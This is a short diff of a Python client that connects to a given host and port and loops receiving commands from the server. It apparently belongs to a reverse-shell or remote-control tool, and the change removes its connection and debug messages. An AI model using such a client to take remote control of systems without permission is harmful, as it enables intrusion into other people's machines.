@@ -10,15 +10,11 @@ PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Change the port if you 
 print('Please wait while we establish a connection...')
 s = socket.socket()
 s.connect((HOST, PORT))
-msg = s.recv(1024).decode()
-print('[*] Server:', msg)
-print('Connection established')
 # Example for custom command, put your code in varName (you can change the name if you want)
 # varName = print('test')
 
 while True:
     cmd = s.recv(1024).decode()
-    # print(f'[*] receive {cmd}')
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
     
